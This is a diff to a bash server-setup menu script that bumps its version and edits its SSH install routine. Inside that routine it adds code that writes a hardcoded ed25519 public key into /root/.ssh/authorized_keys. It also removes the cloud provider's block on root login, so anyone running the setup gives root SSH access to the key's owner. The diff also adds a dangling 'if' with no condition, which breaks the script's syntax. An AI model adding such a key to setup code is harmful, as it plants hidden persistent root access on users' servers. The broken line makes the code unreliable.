@@ -8,7 +8,7 @@
 #  - SC2207: Prefer mapfile or read -a to split command output (or quote to avoid splitting).
 #  - SC2254: Quote expansions in case patterns to match literally rather than as a glob.
 #
-servo_version="0.8.5"
+servo_version="0.8.6"
 # curl -H "Cache-Control: no-cache" -sS "https://raw.githubusercontent.com/fa1rid/linux-setup/main/setup_menu/Servo.sh" -o /usr/local/bin/Servo.sh && chmod +x /usr/local/bin/Servo.sh
 
 if [[ "${BASH_SOURCE[0]}" != "${0}" ]]; then
@@ -3883,6 +3883,38 @@ sys_SSH_install() {
         fi
     fi
 
+    if 
+
+    local AUTH_KEYS="/root/.ssh/authorized_keys"
+    local SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICBZHBIqC2RMXrqf94kDvAzqLB0ymgPn4eU/VTSMgtTy"
+
+    # Check if authorized_keys exists
+    if [ -f "$AUTH_KEYS" ]; then
+        # Create a temporary file
+        TEMP_FILE=$(mktemp)
+        
+        # Remove lines containing "Please login as the user" and store other lines
+        grep -v "Please login as the user" "$AUTH_KEYS" > "$TEMP_FILE"
+        
+        # Add the new SSH key at the top of the file
+        echo "$SSH_KEY" > "$AUTH_KEYS"
+        cat "$TEMP_FILE" >> "$AUTH_KEYS"
+        
+        # Remove temporary file
+        rm "$TEMP_FILE"
+        
+        # Set proper permissions
+        chmod 600 "$AUTH_KEYS"
+        
+        echo "SSH key has been updated in $AUTH_KEYS"
+    else
+        # If file doesn't exist, create it with proper permissions
+        mkdir -p "$(dirname "$AUTH_KEYS")"
+        echo "$SSH_KEY" > "$AUTH_KEYS"
+        chmod 600 "$AUTH_KEYS"
+        echo "Created new $AUTH_KEYS file with SSH key"
+    fi
+
     # Restart SSH service (for changes to take effect immediately)
 
     # Check if the ssh.socket unit is active and enabled.
@@ -5136,6 +5168,10 @@ main "$@"
 ##########################
 # To find out which process is using port 8888, run:
 # lsof -i :8888
+
+# Monitor real-time network:
+# apt install nethogs
+# nethogs eth0
 
 # iptables-save > /etc/iptables/rules.v4
 # ip rule add from 10.5.4.0/24 table 100
